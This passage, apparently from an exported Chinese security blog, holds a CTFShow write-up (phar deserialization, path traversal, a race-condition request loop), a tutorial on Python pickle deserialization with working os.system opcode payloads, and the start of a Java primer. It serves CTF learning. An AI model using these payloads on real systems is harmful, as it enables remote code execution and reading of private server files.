Ctfshow{\n    public $ctfer = 'shower';\n}\n$phar = new Phar('test.phar');\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER();?>\");\n$obj = new Ctfshow();\n$phar->setMetadata($obj);\n$phar->addFromString(\"flag.txt\",\"flag\");\n\n$phar->stopBuffering();\n?>\n```\n\n然后终端运行生成phar文件，我们改成白名单的后缀然后上传\n\n![image-20250411125258767](../image/achieve/202411/大吉大利杯/image-20250411125258767.png)\n\n![image-20250411131005912](../image/achieve/202411/大吉大利杯/image-20250411131005912.png)\n\n这里发现会修改文件名，文件名是当前时间戳的md5加密的值,先读一下uplolad.php的源码\n\n```\n/mc-admin/page-edit.php?file=../../../../../../var/www/html/upload.php\n```\n\n```php\n//upload.php\n<?php\nerror_reporting(0);\n// 允许上传的图片后缀\n$allowedExts = array(\"gif\", \"jpg\", \"png\");\n$temp = explode(\".\", $_FILES[\"file\"][\"name\"]);\n// echo $_FILES[\"file\"][\"size\"];\n$extension = end($temp);     // 获取文件后缀名\nif ((($_FILES[\"file\"][\"type\"] == \"image/gif\")\n|| ($_FILES[\"file\"][\"type\"] == \"image/jpeg\")\n|| ($_FILES[\"file\"][\"type\"] == \"image/png\"))\n&& ($_FILES[\"file\"][\"size\"] < 2048000)   // 小于 2000kb\n&& in_array($extension, $allowedExts))\n{\n\tif ($_FILES[\"file\"][\"error\"] > 0)\n\t{\n\t\techo \"文件出错: \" . $_FILES[\"file\"][\"error\"] . \"<br>\";\n\t}\n\telse\n\t{\n\t\tif (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"]))\n\t\t{\n\t\t\techo $_FILES[\"file\"][\"name\"] . \" 文件已经存在。 \";\n\t\t}\n\t\telse\n\t\t{\n\t\t\t$md5_unix_random =substr(md5(time()),0,8);\n\t\t\t$filename = $md5_unix_random.'.'.$extension;\n            move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $filename);\n            echo \"上传成功,文件存在upload/\";\n\t\t}\n\t}\n}\nelse\n{\n\techo \"文件类型仅支持jpg、png、gif等图片格式\";\n}\n?>\n```\n\n从大师傅的wp里学到一个方法，就是从响应头里得到时间戳，然后再处理md5加密就可以知道具体的文件名了\n\n```\nFri, 11 Apr 2025 05:35:17 GMT\n```\n\n然后我们将日期字符串转换为 Unix 时间戳\n\n```php\n<?php\n$filename = substr(md5(strtotime('Fri, 11 Apr 2025 05:35:17 GMT')),0,8);\necho $filename;\n```\n\n拿到文件名，我们就用phar协议去读取phar文件触发反序列化，但是这里的waf是过滤了phar开头的，zip也是被过滤了，我们可以用zlib\n\n```\n?file=zlib:phar:///var/www/html/upload/5a6442bc.jpg\n```\n\n然后搜索hint\n\n```\n/mc-admin/page-edit.php?file=../../../../../../var/www/html/hint.txt\n//flag{fuckflag***}flag also not here You can access ctfshowgetflaghhhh directory\n```\n\n```php\n<?php\nshow_source(__FILE__);\n$unser = $_GET['unser'];\nclass Unser {\n    public $username='Firebasky';\n    public $password;\n    function __destruct() {\n        if($this->username=='ctfshow'&&$this->password==(int)md5(time())){\n            system('cp /ctfshow* /var/www/html/flag.txt');\n        }\n    }\n}\n$ctf=@unserialize($unser);\nsystem('rm -rf /var/www/html/flag.txt');\nNotice: Undefined index: unser in /var/www/html/ctfshowgetflaghhhh/index.php on line 3\n```\n\n看到有删除操作，需要条件竞争，先写序列化操作\n\n```php\n<?php\nclass User{\n    public $username='ctfshow';\n    public $password;\n\n    function __construct(){\n        $this->password=md5(time());\n    }\n}\n$a = new User();\necho serialize($a);\n//O:4:\"User\":2:{s:8:\"username\";s:7:\"ctfshow\";s:8:\"password\";s:32:\"c10915ed12347b1292bc097c27dbb21b\";}\n```\n\n这里还需要注意这个时间戳不是固定的，得进行特殊处理，写脚本吧\n\n```python\nimport hashlib\nimport time\nimport requests\n\ndef MD5(str):\n    h1 = hashlib.md5(str.encode(\"utf8\")).hexdigest()\n    return h1\n\nif __name__ == '__main__':\n    url = \"http://1f0c86e6-3040-4e14-9f09-041d3ecd0343.challenge.ctf.show/ctfshowgetflaghhhh/\"\n    while True:\n        payload = MD5(str(int(time.time())))\n        print(payload)\n        params = '?unser=O:5:\"Unser\":2:{s:8:\"username\";s:7:\"ctfshow\";s:8:\"password\";s:32:\"'+ payload +'\";}'\n        r = requests.get(url+params)\n        print(r.text)\n```\n\n用死循环语句让他一直发包然后我们去访问这个文件就行\n\n![image-20250411141137526](../image/achieve/202411/大吉大利杯/image-20250411141137526.png)\n\n\n\n# 虎山行's revenge\n\n这道题其实跟之前没啥区别，就是文件名换了，打法是一样的\n\n# 有手就行\n\n源码有加密的编码，base64隐写\n\n![image-20250410134353736](../image/achieve/202411/大吉大利杯/image-20250410134353736.png)\n\nbase64转图片\n\n![image-20250410134720963](../image/achieve/202411/大吉大利杯/image-20250410134720963.png)\n\n应该是往file里传文件名，但是试了几个都没回应，后来才知道在源码里面可以隐写，我们传入flag又获得一段隐写内容， 是一个小程序的二维码\n\n![image-20250410135537772](../image/achieve/202411/大吉大利杯/image-20250410135537772.png)\n\n这道题有点抽象，感觉没啥思路，wp也不多，先放着吧\n","tags":["大吉大利杯"],"categories":["ctfshow"]},{"title":"pickle反序列化","url":"/2025/04/08/pickle反序列化/","content":"\n# 前置知识\n\n这几天打完xyctf了，里面刚好有一道pickle反序列化的题目，当时也是现学然后现打的，但总归学的还是不仔细，赛后还是得针对性的学一下\n\n## 什么是Pickle？\n\n参考官方文档：[`pickle` --- Python 对象序列化](https://docs.python.org/zh-cn/3/library/pickle.html#module-pickle)\n\n跟PHP反序列化一样，在python中也会存在对象序列化和反序列化的操作，那么Pickle就是用于实现这一功能的模块之一\n\n模块 `pickle` 实现了对一个 Python 对象结构的二进制序列化和反序列化。 *\"pickling\"* 是将 Python 对象及其所拥有的层次结构转化为一个字节流的过程，而 *\"unpickling\"* 是相反的操作，会将（来自一个 binary file 或者 bytes-like object 的）字节流转化回一个对象层次结构。\n\n![image-20250408160507410](../image/achieve/202411/Pickle反序列化/image-20250408160507410.png)\n\n但是其实在python中并不只有pickle可以实现序列化的操作，python有一个更原始的序列化模块叫`marshal`,但一般地 `pickle` 应该是序列化 Python 对象时的首选。`marshal` 存在主要是为了支持 Python 的 `.pyc` 文件.\n\n但是根据官方文档的话，他有提到一个更安全的序列化格式json，这两个有什么区别呢\n\n## Pickle和JSON的区别\n\n- JSON 是一个文本序列化格式（它输出 unicode 文本，尽管在大多数时候它会接着以 `utf-8` 编码），而 pickle 是一个二进制序列化格式；\n- JSON 是我们可以直观阅读的，而 pickle 不是；\n- JSON是可互操作的，在Python系统之外广泛使用，而pickle则是Python专用的；\n- 默认情况下，JSON 只能表示 Python 内置类型的子集，不能表示自定义的类；但 pickle 可以表示大量的 Python 数据类型（可以合理使用 Python 的对象内省功能自动地表示大多数类型，复杂情况可以通过实现 specific object APIs 来解决）。\n- 不像pickle，对一个不信任的JSON进行反序列化的操作本身不会造成任意代码执行漏洞。\n\n## Pickle模块常见接口\n\n要序列化某个包含层次结构的对象，只需调用 `dumps()` 函数即可。同样，要反序列化数据流，可以调用 `loads()` 函数。\n\n![image-20250408161658809](../image/achieve/202411/Pickle反序列化/image-20250408161658809.png)\n\n然后我们来写个实例分析一下pickle序列化和反序列化的操作\n\n## pickle实例分析\n\n```py\nimport pickle\n\nclass Person:\n    def __init__(self):\n        self.age = 20\n        self.name = \"Vu1n4bly\"\np = Person()\n\n#序列化操作\ntest = pickle.dumps(p)\nprint(test)\n#序列化结果：b'\\x80\\x04\\x959\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x06Person\\x94\\x93\\x94)\\x81\\x94}\\x94(\\x8c\\x03age\\x94K\\x14\\x8c\\x04name\\x94\\x8c\\x08Vu1n4bly\\x94ub.'\n\n#反序列化操作\ntest2 = pickle.loads(test)\nprint(test2)\n#反序列化结果<__main__.Person object at 0x00000225672867B0>\n```\n\n在代码中我创建了Person类，并通过init初始化了两个变量name和age，并实例化了对象，然后使用`pickle.dumps()`函数将一个Person对象序列化成二进制字节流的形式。然后使用`pickle.loads()`将一串二进制字节流反序列化为一个Person对象。\n\n什么反序列化结果是对象内存地址？\n\n1. **序列化内容解析**\n\n   - Pickle 的二进制输出包含：\n     - 类定义信息（来自 `__main__` 模块的 `Person` 类）\n     - 实例属性值（`age=20` 和 `name=\"Vu1n4bly\"`）\n\n2. **反序列化过程**\n\n   - Pickle 会：\n     1. 找到 `__main__.Person` 类的定义 2.创建一个新的 `Person` 实例\n     2. 恢复其属性值（`age` 和 `name`）\n     3. 返回这个新对象\n\n3. **输出结果的本质**`print(test2)`\n\n   输出的是对象的默认字符串表示形式：\n\n   - `<__main__.Person object at 0x内存地址>`\n\n   - 这是 Python 所有对象的默认 `____` 输出格式\n   - 内存地址每次运行都会变化（这是新创建对象的特征）\n\n所以我们试一下输出反序列化后的对象的内容\n\n```python\nimport pickle\n\nclass Person:\n    def __init__(self):\n        self.age = 20\n        self.name = \"Vu1n4bly\"\np = Person()\n\n#序列化操作\ntest = pickle.dumps(p)\nprint(test)\n#序列化结果：b'\\x80\\x04\\x959\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x06Person\\x94\\x93\\x94)\\x81\\x94}\\x94(\\x8c\\x03age\\x94K\\x14\\x8c\\x04name\\x94\\x8c\\x08Vu1n4bly\\x94ub.'\n\n#反序列化操作\ntest2 = pickle.loads(test)\nprint(test2)\n#反序列化结果<__main__.Person object at 0x00000225672867B0>\n\n#输出内容\nprint(\"age = \" + str(test2.age))\nprint(\"name = \" + test2.name)\n'''\nage = 20\nname = Vu1n4bly\n'''\n```\n\n可以看到这里可以直接访问并输出反序列化对象的内容\n\n## 能够序列化的对象类型\n\n这个在官方文档中也有介绍到\n\n![image-20250408162711168](../image/achieve/202411/Pickle反序列化/image-20250408162711168.png)\n\n以上就是我们的前置知识了\n\n# Pickle反序列化漏洞\n\n在上面跟json模块的对比中，从最后一点可以看出，pickle在操作的时候是可能被造成任意代码执行漏洞的，这是为什么呢？这取决于Pickle模块中对数据的不安全处理，pickle 数据来 **在解封时执行任意代码** 是可能的。如果我们在数据中包含精心构造的恶意代码，就可能会导致恶意代码被执行，这是为什么呢？\n\n## 漏洞成因\n\n- Pickle数据在**反序列化时自动执行Python字节码（或对象方法）**\n- 模块本质上不会对反序列化的内容进行校验\n\n如果我们使用`pickle.loads()`方法`unpickling`的时候，本质上是在重构对象，而并非简单的解析数据，如果我们对象定义了魔术方法例如`__reduce__`，Pickle 会调用它，并存储其返回内容作为反序列化的依据。\n\n## 什么是`__reduce__`方法\n\n`__reduce__`方法在定义的时候是不带任何形参的，但是应返回字符串或最好返回一个元组(返回的对象通常称为“reduce 值”)。\n\n![image-20250408164454575](../image/achieve/202411/Pickle反序列化/image-20250408164454575.png)\n\n方法定义\n\n```python\ndef __reduce__(self):\n    return (callable, args_tuple)\n```\n\n- **`callable`**：可调用对象（如 `exec`, `os.system`, `lambda`, 或一个类名）。\n- **`args_tuple`**：传给 `callable` 的参数（必须是一个元组）。\n\n可以把返回值理解成PHP中`call_user_func`函数的运用，第一个参数就是需要传入的类或者函数对象，后面的元组是需要传入该函数的参数\n\n我们写个实例\n\n```python\nimport pickle\nimport os\n\nclass Person:\n    def __init__(self):\n        self.age = 20\n        self.name = \"Vu1n4bly\"\n\n    def __reduce__(self):\n        command = r\"whoami\"  # 要执行的系统命令\n        return (os.system, (command,))  # 返回可执行元组\n\n\np = Person()\ntest = pickle.dumps(p)\n\ntest2 = pickle.loads(test)\n#wanth3f1ag\\23232\n```\n\n可以看到在字节流被反序列化后，Python会调用`__reduce__`，并将os.system,(command,)作为返回值，这里返回了whoami的执行结果\n\n以上的结果就是简单的对pickle反序列化漏洞进行了一点讲解，如果想深入的话，我们来看看pickle的工作原理\n\n## pickle基于PVM的工作原理\n\n参考文章：[Pickle反序列化](https://goodapple.top/archives/1069)\n\n学过编程都知道，任何语言到最后都是以字节码的形式而存在的，python代码的执行也是如此，一门解释性语言也会把源码解析编译为字节码，也就是pyc文件\n\nPython Virtual Machine (PVM) 是 Python *运行时环境* 的核心组件，它负责 **执行 Python 字节码**，使其能够在不同系统上运行。这就跟Java中的JVM一样，但是这个是属于python中的\n\n其实pickle模块在序列化Python对象时，会生成一系列操作码（opcode）来表示对象的类型和值。而在反序列化的时候，pickle模块读取操作码序列，并将其解释为Python对象。它**通过Pickle Virtual Machine来执行操作码序列。**此时PVM会按照顺序读取操作码，并根据操作码执行相应的操作\n\nPVM由以下三部分组成\n\n- 指令处理器：从流中读取 `opcode` 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回。\n- stack：由 Python 的 **`list`** 实现，被用来临时存储数据、参数以及对象。\n- memo：由 Python 的 **`dict`** 实现，为 PVM 的整个生命周期提供存储。\n\n![img](../image/achieve/202411/Pickle反序列化/v2-5e2eeae4c4943c31aee406fa3b467301_720w.jpg)\n\n当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。\n\n- v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python。\n- v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。\n- v2 版协议是在 Python 2.3 中引入的。它为存储 [new-style class](https://docs.python.org/zh-cn/3.7/glossary.html#term-new-style-class) 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 [**PEP 307**](https://www.python.org/dev/peps/pep-0307)。\n- v3 版协议添加于 Python 3.0。它具有对 [`bytes`](https://docs.python.org/zh-cn/3.7/library/stdtypes.html#bytes) 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。\n- v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 [**PEP 3154**](https://www.python.org/dev/peps/pep-3154)。\n\n**pickle协议是向前兼容的**，0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。下面我们以V0版本为例，介绍一下常见的opcode\n\n## 全部opcode\n\n```\nMARK           = b'('   # push special markobject on stack\nSTOP           = b'.'   # every pickle ends with STOP\nPOP            = b'0'   # discard topmost stack item\nPOP_MARK       = b'1'   # discard stack top through topmost markobject\nDUP            = b'2'   # duplicate top stack item\nFLOAT          = b'F'   # push float object; decimal string argument\nINT            = b'I'   # push integer or bool; decimal string argument\nBININT         = b'J'   # push four-byte signed int\nBININT1        = b'K'   # push 1-byte unsigned int\nLONG           = b'L'   # push long; decimal string argument\nBININT2        = b'M'   # push 2-byte unsigned int\nNONE           = b'N'   # push None\nPERSID         = b'P'   # push persistent object; id is taken from string arg\nBINPERSID      = b'Q'   #  \"       \"         \"  ;  \"  \"   \"     \"  stack\nREDUCE         = b'R'   # apply callable to argtuple, both on stack\nSTRING         = b'S'   # push string; NL-terminated string argument\nBINSTRING      = b'T'   # push string; counted binary string argument\nSHORT_BINSTRING= b'U'   #  \"     \"   ;    \"      \"       \"      \" &lt; 256 bytes\nUNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument\nBINUNICODE     = b'X'   #   \"     \"       \"  ; counted UTF-8 string argument\nAPPEND         = b'a'   # append stack top to list below it\nBUILD          = b'b'   # call __setstate__ or __dict__.update()\nGLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args\nDICT           = b'd'   # build a dict from stack items\nEMPTY_DICT     = b'}'   # push empty dict\nAPPENDS        = b'e'   # extend list on stack by topmost stack slice\nGET            = b'g'   # push item from memo on stack; index is string arg\nBINGET         = b'h'   #   \"    \"    \"    \"   \"   \"  ;   \"    \" 1-byte arg\nINST           = b'i'   # build &amp; push class instance\nLONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg\nLIST           = b'l'   # build list from topmost stack items\nEMPTY_LIST     = b']'   # push empty list\nOBJ            = b'o'   # build &amp; push class instance\nPUT            = b'p'   # store stack top in memo; index is string arg\nBINPUT         = b'q'   #   \"     \"    \"   \"   \" ;   \"    \" 1-byte arg\nLONG_BINPUT    = b'r'   #   \"     \"    \"   \"   \" ;   \"    \" 4-byte arg\nSETITEM        = b's'   # add key+value pair to dict\nTUPLE          = b't'   # build tuple from topmost stack items\nEMPTY_TUPLE    = b')'   # push empty tuple\nSETITEMS       = b'u'   # modify dict by adding topmost key+value pairs\nBINFLOAT       = b'G'   # push float; arg is 8-byte float encoding\n\nTRUE           = b'I01\\n'  # not an opcode; see INT docs in pickletools.py\nFALSE          = b'I00\\n'  # not an opcode; see INT docs in pickletools.py\n\n# Protocol 2\n\nPROTO          = b'\\x80'  # identify pickle protocol\nNEWOBJ         = b'\\x81'  # build object by applying cls.__new__ to argtuple\nEXT1           = b'\\x82'  # push object from extension registry; 1-byte index\nEXT2           = b'\\x83'  # ditto, but 2-byte index\nEXT4           = b'\\x84'  # ditto, but 4-byte index\nTUPLE1         = b'\\x85'  # build 1-tuple from stack top\nTUPLE2         = b'\\x86'  # build 2-tuple from two topmost stack items\nTUPLE3         = b'\\x87'  # build 3-tuple from three topmost stack items\nNEWTRUE        = b'\\x88'  # push True\nNEWFALSE       = b'\\x89'  # push False\nLONG1          = b'\\x8a'  # push long from &lt; 256 bytes\nLONG4          = b'\\x8b'  # push really big long\n\n_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]\n\n# Protocol 3 (Python 3.x)\n\nBINBYTES       = b'B'   # push bytes; counted binary string argument\nSHORT_BINBYTES = b'C'   #  \"     \"   ;    \"      \"       \"      \" &lt; 256 bytes\n\n# Protocol 4\n\nSHORT_BINUNICODE = b'\\x8c'  # push short string; UTF-8 length &lt; 256 bytes\nBINUNICODE8      = b'\\x8d'  # push very long string\nBINBYTES8        = b'\\x8e'  # push very long bytes string\nEMPTY_SET        = b'\\x8f'  # push empty set on the stack\nADDITEMS         = b'\\x90'  # modify set by adding topmost stack items\nFROZENSET        = b'\\x91'  # build frozenset from topmost stack items\nNEWOBJ_EX        = b'\\x92'  # 类似于NEWOBJ，但只使用关键字参数\nSTACK_GLOBAL     = b'\\x93'  # 与GLOBAL相同，但使用堆栈上的名称\nMEMOIZE          = b'\\x94'  # 在memo中存储栈顶\nFRAME            = b'\\x95'  # 表示新帧的开始\n\n# Protocol 5\n\nBYTEARRAY8       = b'\\x96'  # 推字节数组\nNEXT_BUFFER      = b'\\x97'  # 推入下一个带外缓冲器\nREADONLY_BUFFER  = b'\\x98'  # 使栈顶只读\n```\n\n## 常用opcode\n\n| 指令 | 描述                                                         | 具体写法                                           | 栈上的变化                                                   |\n| :--- | :----------------------------------------------------------- | :------------------------------------------------- | :----------------------------------------------------------- |\n| c    | 获取一个全局对象或import一个模块                             | c[module]\\n[instance]\\n                            | 获得的对象入栈                                               |\n| o    | 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） | o                                                  | 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 |\n| i    | 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） | i[module]\\n[callable]\\n                            | 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 |\n| N    | 实例化一个None                                               | N                                                  | 获得的对象入栈                                               |\n| S    | 实例化一个字符串对象                                         | S'xxx'\\n（也可以使用双引号、\\'等python字符串形式） | 获得的对象入栈                                               |\n| V    | 实例化一个UNICODE字符串对象                                  | Vxxx\\n                                             | 获得的对象入栈                                               |\n| I    | 实例化一个int对象                                            | Ixxx\\n                                             | 获得的对象入栈                                               |\n| F    | 实例化一个float对象                                          | Fx.x\\n                                             | 获得的对象入栈                                               |\n| R    | 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 | R                                                  | 函数和参数出栈，函数的返回值入栈                             |\n| .    | 程序结束，栈顶的一个元素作为pickle.loads()的返回值           | .                                                  | 无                                                           |\n| (    | 向栈中压入一个MARK标记                                       | (                                                  | MARK标记入栈                                                 |\n| t    | 寻找栈中的上一个MARK，并组合之间的数据为元组                 | t                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 |\n| )    | 向栈中直接压入一个空元组                                     | )                                                  | 空元组入栈                                                   |\n| l    | 寻找栈中的上一个MARK，并组合之间的数据为列表                 | l                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 |\n| ]    | 向栈中直接压入一个空列表                                     | ]                                                  | 空列表入栈                                                   |\n| d    | 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） | d                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 |\n| }    | 向栈中直接压入一个空字典                                     | }                                                  | 空字典入栈                                                   |\n| p    | 将栈顶对象储存至memo_n                                       | pn\\n                                               | 无                                                           |\n| g    | 将memo_n的对象压栈                                           | gn\\n                                               | 对象被压栈                                                   |\n| 0    | 丢弃栈顶对象                                                 | 0                                                  | 栈顶对象被丢弃                                               |\n| b    | 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 | b                                                  | 栈上第一个元素出栈                                           |\n| s    | 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 | s                                                  | 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 |\n| u    | 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 | u                                                  | MARK标记以及被组合的数据出栈，字典被更新                     |\n| a    | 将栈的第一个元素append到第二个元素(列表)中                   | a                                                  | 栈顶元素出栈，第二个元素（列表）被更新                       |\n| e    | 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 | e                                                  | MARK标记以及被组合的数据出栈，列表被更新                     |\n\n然后我们可以通过dis函数去输出字节码,Python的`dis`模块是用于**反汇编(disassemble)**Python字节码的核心工具，可以展示代码是如何被PVM执行的。\n\n![image-20250408170626254](../image/achieve/202411/Pickle反序列化/image-20250408170626254.png)\n\n接下来我们看一下\n\n## 分析字节流\n\n```python\nimport pickle\nimport os\nimport pickletools\nclass Person:\n    def __init__(self):\n        self.age = 20\n        self.name = \"Vu1n4bly\"\n\n    def __reduce__(self):\n        command = r\"whoami\"  # 要执行的系统命令\n        return (os.system, (command,))  # 返回可执行元组\n\n\np = Person()\ntest = pickle.dumps(p)\npickletools.dis(test)\n'''\n    0: \\x80 PROTO      4\n    2: \\x95 FRAME      30\n   11: \\x8c SHORT_BINUNICODE 'nt'\n   15: \\x94 MEMOIZE    (as 0)\n   16: \\x8c SHORT_BINUNICODE 'system'\n   24: \\x94 MEMOIZE    (as 1)\n   25: \\x93 STACK_GLOBAL\n   26: \\x94 MEMOIZE    (as 2)\n   27: \\x8c SHORT_BINUNICODE 'whoami'\n   35: \\x94 MEMOIZE    (as 3)\n   36: \\x85 TUPLE1\n   37: \\x94 MEMOIZE    (as 4)\n   38: R    REDUCE\n   39: \\x94 MEMOIZE    (as 5)\n   40: .    STOP\nhighest protocol among opcodes = 4\n'''\n```\n\n我们看一下这段字节流数据\n\n```python\n0: \\x80 PROTO      4     ← 协议版本4\n2: \\x95 FRAME      30    ← 数据帧(30字节) \n11: \\x8c SHORT_BINUNICODE 'nt'       ← 模块名'nt'（Windows下的os模块别名）\n15: \\x94 MEMOIZE    (as 0)           ← 缓存到memo[0]\n16: \\x8c SHORT_BINUNICODE 'system'   ← 函数名'system'\n24: \\x94 MEMOIZE    (as 1)           ← 缓存到memo[1]\n25: \\x93 STACK_GLOBAL                ← 组合成全局对象`nt.system`\n26: \\x94 MEMOIZE    (as 2)           ← 缓存到memo[2]\n27: \\x8c SHORT_BINUNICODE 'whoami'   ← 命令参数'whoami'\n35: \\x94 MEMOIZE    (as 3)           ← 缓存到memo[3]\n36: \\x85 TUPLE1                      ← 打包为元组`('whoami',)`\n37: \\x94 MEMOIZE    (as 4)           ← 缓存到memo[4]\n38: R    REDUCE                      ≈ 调用`nt.system(*('whoami',))` ⚠️危险！\n39: \\x94 MEMOIZE    (as 5)           ← 无实际意义（STOP前冗余操作）\n40: .    STOP                        ← 结束\n\n```\n\n关键指令\n\n- **`STACK_GLOBAL` (0x93)**\n\n从栈顶弹出两个字符串 (`模块名` 和 `属性名`)，组合成全局对象\n\n- **`REDUCE` (0x52)**\n\n1. 弹出栈顶的元组作为参数 (`args`)\n2. 弹出下一个对象作为可调用对象 (`callable`)\n\n这里的话就等价于\n\n```\nimport os os.system('whoami')\n```\n\n师傅的文章中给出了PVM解析`__reduce__()`的过程\n\n![img](../image/achieve/202411/Pickle反序列化/20200320230711-7972c0ea-6abc-1.gif)\n\n所以我们可以很清晰的领会到opcode在PVM中的操作流程，那接下来我们就可以根据opcode指令手写opcode\n\n## 实操opcode\n\n```python\nimport pickle\n\nopcode =b'''cos\nsystem\n(S'whoami'\ntR.\n'''\npickle.loads(opcode)\n#wanth3f1ag\\23232\n```\n\n解释一下opcode\n\n- `c`：获取一个全局对象或import一个模块，写法是`c[module]\\n[instance]\\n`，这里是import了os模块\n\n根据上面的`STACK_GLOBAL` (0x93)可以知道这里是相当于导入os模块，调用system\n\n- `(`：向栈中压入一个MARK标记\n- `S`：实例化一个字符串对象，压入whoami字符串\n- `t`：寻找栈中的上一个MARK，并组合之间的数据为元组，也就是`('whoami')`\n- `R`：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数，就是system('whoami')\n- `.`：程序结束，把函数执行结果作为返回值\n\n## opcode和`__reduce__`\n\n上面我们也写到了我们可以通过重构`__reduce__`的方法在反序列化的时候执行任意命令，但是这个方法每次只能执行一个命令，而opcode不一样，我们可以通过将字节流拼接的方式执行多个命令\n\n```python\nimport pickle\n\nopcode = b'''cos\nsystem\n(S'whoami'\ntRcos\nsystem\n(S'ls'\ntR.'''\npickle.loads(opcode)\n'''\nroot@VM-16-12-ubuntu:/var/www/html# python3 test.py \nroot\n1.php  index.nginx-debian.html  test.py\n'''\n```\n\n成功执行ls和whoami两个命令\n\n在常用opcode中可以看到，在pickle中用来构造函数执行的字节码有：`R`、`i`、`o`共同实现命令执行。\n\n- `R`：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。**函数和参数出栈，函数的返回值入栈**\n\n上面讲的就是R字节码的操作\n\n- `o`：寻找栈中的上一个MARK(`t`的操作），以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象），**这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈**\n\n```py\nimport pickle\n\nopcode = b'''(cos\nsystem\nS'whoami'\no.\n'''\nroot@VM-16-12-ubuntu:/var/www/html# python3 test.py \nroot\n'''\n```\n\n- `i`：相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）用法：`i[module]\\n[callable]\\n`**，这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈**\n\n```py\nimport pickle\n\nopcode=b'''(S'whoami'\nios\nsystem\n.'''\nroot@VM-16-12-ubuntu:/var/www/html# python3 test.py \nroot\n'''\n```\n\n先学这么多吧~后面有积累到新姿势会回来补充的\n","tags":["pickle反序列化"],"categories":["pickle反序列化"]},{"title":"Java从0到1的学习","url":"/2025/04/02/Java从0到1的学习/","content":"\n# 基础知识\n\n先讲讲Java语言的几个重要特性\n\n- Java语言是面向对象的语言(oop)\n- Java语言是健壮的，Java 的强类型机制、异常处理、垃圾的自动收集等是 Java 程序健壮性的重要保证。\n- Java语言是跨平台型的语言\n- Java语言是强类型的语言\n- Java语言是解释型语言\n- 解释型语言:javascript,PHP,java； 编译性语言:C/C++\n\n什么是解释性语言？就是编译后的代码不能直接被机器执行的，需要解释器去执行\n\n然后还有两个特别的名词，JDK和JRE，他们分别是什么呢？\n\nJRE就是运行java字节码的一种虚拟机环境，而JDK是java的开发工具包，包含了java的开发，编译的工具和环境，可以将java代码编译成字节码\n\n一个 Java 程序可以认为是一系列对象的集合，而这些对象通过调用彼此的方法来协同工作。\n\n程序员的第一个程序必然就是hello world了，那我们先拿这个代码来分析一下\n\n```java\npublic class HelloWorld {\n    /* 我的第一个Java程序\n     * 它将输出字符串 Hello World\n     */\n    public static void main(String[] args) {\n        System.out.println(\"Hello World\"); // 输出 Hello World\n    }\n}\n```\n\n类声明\n\n- **public**：这是一个访问修饰符，表示该类可以被其他类访问。\n- **class**：关键字，用于声明一个类。\n- **HelloWorld**：这是类的名称，必须与文件名相同（HelloWorld.java）。\n\nmain主方法：\n\n- **public**：修饰符，表示该方法可以被任何其他类调用。\n- **static**：关键字，表示该方法属于类，而不是类的实例。程序运行时不需要先创建类的对象。\n- **void**：表示该方法没有返回值。\n- **main**：方法名称，Java 程序的入口点。JVM（Java Virtual Machine）会从这里开始执行程序。\n- **String[] args**：这是一个参数，表示可以接收命令行输入的字符串数组。\n\n输出语句\n\n- **System.out**：这是 Java 中的一个输出流对象，用于向控制台打印信息。\n- **println**：这是一个方法，用于打印括号内的内容，并在打印后换行。\n- **\"Hello World\"**：这是要输出的字符串。\n\n代码编辑好后运行的话就是在cmd窗口进行操作\n\n![](../image/achieve/202411/极客大挑战2020/image-20250112002414761.png)\n\n**javac** 是 Java 编译器，它的作用是读取 `.java` 文件并将其编译成 `.class` 文件，一旦生成了 `.class` 文件，就可以使用 `java` 命令来运行程序\n\n编写 Java 程序时，应注意以下几点：\n\n- **大小写敏感**：Java 